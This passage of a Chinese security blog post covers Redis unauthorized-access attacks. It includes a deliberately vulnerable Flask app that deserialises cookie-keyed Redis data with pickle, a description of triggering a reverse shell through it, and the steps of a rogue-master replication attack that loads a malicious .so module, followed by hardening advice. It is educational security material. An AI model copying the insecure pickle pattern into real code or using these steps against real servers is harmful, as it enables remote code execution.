    <span class="token keyword">def</span> <span class="token function">set_data</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span>key<span class="token punctuation">,</span>data<span class="token punctuation">,</span>ex<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#连接redis数据库后存值，（key=data）</span>
        r<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span>ex<span class="token punctuation">)</span>  <span class="token comment">#在存储数据时先对数据进行序列化</span>
    <span class="token decorator annotation punctuation">@staticmethod</span>
    <span class="token keyword">def</span> <span class="token function">get_data</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#取值，根据key来取值，并对取出的数据进行反序列化</span>
        data <span class="token operator">=</span> r<span class="token punctuation">.</span>get<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
        <span class="token keyword">if</span> data <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">None</span>
        <span class="token keyword">return</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">getrand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#获取随机字符串</span>
    <span class="token builtin">str</span><span class="token operator">=</span><span class="token string">'abcdefghijklnmopqrstuvwxyz1234567890'</span>
    count <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            index <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">)</span>
            count <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">[</span>index<span class="token punctuation">]</span>
    <span class="token keyword">return</span> count
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">#用户请求为：http://127.0.0.1:5000?str=test,服务端获取str值并存入到redis,key是随机字符串，data是test</span>
<span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">str</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'str'</span><span class="token punctuation">)</span>
    r <span class="token operator">=</span> Redis<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">)</span>
    rand <span class="token operator">=</span> getrand<span class="token punctuation">(</span><span class="token punctuation">)</span>
    Redis<span class="token punctuation">.</span>set_data<span class="token punctuation">(</span>r<span class="token punctuation">,</span>rand<span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> rand<span class="token operator">+</span><span class="token string">':'</span><span class="token operator">+</span><span class="token builtin">str</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/getcookie'</span><span class="token punctuation">)</span><span class="token comment">#当用户访问http://127.0.0.1:5000/getcookie时需要提前在浏览器中设置cookie：session=key。注意key是存数据之前随机生成的，读取数据。对序列化的数据进行反序列化</span>
<span class="token keyword">def</span> <span class="token function">get_cookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    cookie <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'session'</span><span class="token punctuation">)</span>
    r <span class="token operator">=</span> Redis<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> Redis<span class="token punctuation">.</span>get_data<span class="token punctuation">(</span>r<span class="token punctuation">,</span>cookie<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'your data:'</span><span class="token punctuation">,</span>data
<span class="token comment">#return cookie</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>访问 <code>/</code>路由，传入str参数</p>
<p><img src="image-20220609192857059.png" alt="image-20220609192857059" loading="lazy"></p>
<p><img src="image-20220609193602386.png" alt="image-20220609193602386" loading="lazy"></p>
<p>同样在redis数据库中写入了这个str，所以这里存在有未授权的访问</p>
<p>在 <code>/getcookie</code>路由中将cookie值作为key值取出数据，并进行反序列化之后输出</p>
<p>我们就可以通过写入危险的数据，比如说经过序列化之后会反弹shell的数据</p>
<p>构造payload:</p>
<p><img src="image-20220609194656032.png" alt="image-20220609194656032" loading="lazy"></p>
<p>成功写入了redis中</p>
<p><img src="image-20220609194722702.png" alt="image-20220609194722702" loading="lazy"></p>
<p>在控制台<code>document.cookie=&#39;session=xxxx&#39;</code>写入session ，进行反序列化触发payload</p>
<p><img src="image-20220609195441054.png" alt="image-20220609195441054" loading="lazy"></p>
<p>成功反弹shell</p>
<h2 id="Redis主从复制（4-x-5-x）"><a href="#Redis主从复制（4-x-5-x）" class="headerlink" title="Redis主从复制（4.x, 5.x）"></a>Redis主从复制（4.x, 5.x）</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>主从复制的作用</p>
<ol>
<li>数据副本(备份)</li>
<li>扩展读性能(读写分离)</li>
</ol>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>如图所示左边是Master节点，右边是slave节点，即主节点和从节点。从节点也是可以对外提供服务的，主节点是有数据的，从节点可以通过复制操作将主节点的数据同步过来，并且随着主节点数据不断写入，从节点数据也会做同步的更新。<br> 整体起到的就是数据备份的效果。</p>
<p><img src="image-20220625194420993.png" alt="image-20220625194420993" loading="lazy"></p>
<p>除了一主一从模型之外，redis还提供了一主多从的模型，也就是一个master可以有多个slave，也就相当于有了多份的数据副本。<br> 这样可以做一个更加高可用的选择，例如一个master和一个slave挂掉了，还能有其他的slave数据备份。</p>
<p>除了作为数据备份，主从模型还能做另外一个功能，就是读写分离。<br>让master节点负责提供写服务，而将数据读取的压力进行分流和负载，分摊给所有的从节点。</p>
<p><img src="image-20220625194502872.png" alt="image-20220625194502872" loading="lazy"></p>
<ol>
<li>一个master可以有多个slave</li>
<li>一个slave只能有一个master</li>
<li>数据流向是单向的，master到slave</li>
</ol>
<h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><p>使得 redis-6380成为redis-6379的从节点</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-638<span class="token operator"><span class="token file-descriptor important">0</span>></span> slaveof <span class="token function">ip</span> <span class="token number">6379</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>取消主从复制</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-638<span class="token operator"><span class="token file-descriptor important">0</span>></span> slaveof no one<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 下载redis</span>
<span class="token function">wget</span> http://download.redis.io/releases/redis-4.0.11.tar.gz
<span class="token comment"># 解压</span>
<span class="token function">tar</span> -zxvf redis-xxx.tar.gz
<span class="token comment"># 复制成三个</span>
<span class="token function">mv</span> redis-xxx redis-xxx.master
<span class="token function">cp</span> -r redis-xxx.master redis-xxx.slave1
<span class="token function">cp</span> -r redis-xxx.master redis-xxx.slave2
<span class="token comment"># 备份配置文件</span>
<span class="token function">cp</span> redis.conf redis.conf.bak
<span class="token comment"># 配置文件</span>
logfile
port
slaveof <span class="token function">ip</span> port
daemonize <span class="token function">yes</span> <span class="token comment"># 后台运行</span>
<span class="token comment"># 运行</span>
./src/redis-server redis.conf
<span class="token comment"># 查看身份</span>
info replication
master
slave
slave<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h3><p>(1) 支持传输备份文件</p>
<p>(2)支持加载so链接库，拓展命令</p>
<blockquote>
<ul>
<li>第一步，我们伪装成redis数据库，然后受害者将我们的数据库设置为主节点。</li>
<li>第二步，我们设置备份文件名为so文件</li>
<li>第三步，设置传输方式为全量传输</li>
<li>第四步加载恶意so文件，实现任意命令执行</li>
</ul>
</blockquote>
<p>示例：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/458271946">Redis攻击方法总结 - 知乎 (zhihu.com)</a></p>
<h3 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h3><p><strong>禁止监听在公网地址</strong>：将redis.conf中的bind 0.0.0.0 改为bind 内网地址</p>
<p><strong>修改默认的监听端口</strong>：修改port: 6379 为其他端口</p>
<p><strong>开启Redis安全认证并设置复杂的密码</strong></p>
<p><strong>禁止使用Root权限启动</strong></p>
<p><strong>设置Redis配置文件的访问权限</strong></p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">chmod 600 /&lt;filepath>/redis.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1764331">Redis未授权访问漏洞利用总结 - 云+社区 - 腾讯云 (tencent.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/WNPhS6au4N6PIUbm8rHkkw">https://mp.weixin.qq.com/s/WNPhS6au4N6PIUbm8rHkkw</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/458271946">Redis攻击方法总结 - 知乎 (zhihu.com)</a></p>
<p><a target="_blank" rel="noopener" href="http://diego.team/2020/08/09/Redis-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Redis 主从复制漏洞分析 - Diego | BY Blog</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/9548962.html">10.Redis未授权访问漏洞复现与利用 - bmjoker - 博客园 (cnblogs.com)</a></p>
</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="Donate" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">I'm so cute. Please give me money.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/B01E5F9A0F70645FFD7D980FB6243619.jpg"><img loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/B01E5F9A0F70645FFD7D980FB6243619.jpg" alt="支付宝" title="支付宝"></a><div><span style="color:#00A3EE"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-alipay-line"></use></svg></span></div></div><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/D4AD9FA7BDA95604D2919F414577B0BA.png"><img loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/D4AD9FA7BDA95604D2919F414577B0BA.png" alt="QQ 支付" title="QQ 支付"></a><div><span style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></span></div></div><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/E8775427D2C8BC65C9AC73AE4CE5A3D8.jpg"><img loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/E8775427D2C8BC65C9AC73AE4CE5A3D8.jpg" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>RoboTerh</li><li class="post-copyright-link"><strong>Post link: </strong><a href="https://roboterh.github.io/2022/06/09/Redis%E6%BC%8F%E6%B4%9E%E5%BD%92%E7%BA%B3/" title="Redis未授权访问漏洞复现">https://roboterh.github.io/2022/06/09/Redis%E6%BC%8F%E6%B4%9E%E5%BD%92%E7%BA%B3/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> unless otherwise stated.</li></ul><script>document.addEventListener('copy', function (event) {
  const clipboardData = event.clipboardData || window.clipboardData;
  if (!clipboardData) { return; }
  const text = window.getSelection().toString();
  if (text) {
    event.preventDefault();
    clipboardData.setData('text/plain', text + '\n\nPost author: RoboTerh\nPost link: https://roboterh.github.io/2022/06/09/Redis%E6%BC%8F%E6%B4%9E%E5%BD%92%E7%BA%B3/\nCopyright Notice: All articles in this blog are licensed under CC BY-NC-SA 4.0 unless otherwise stated.');
  }
});</script></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2022/06/30/Docker%E4%BD%BF%E7%94%A8%E5%A4%87%E5%BF%98%E5%BD%95/" rel="prev" title="Docker使用备忘录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">Docker使用备忘录</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2022/06/08/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8Esession%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="next" title="session反序列化与session文件包含"><span class="post-nav-text">session反序列化与session文件包含</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>要不要和我说些什么？</span><br></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2022 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> RoboTerh</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v5.4.0</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.7.0</span></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a></div></body></html>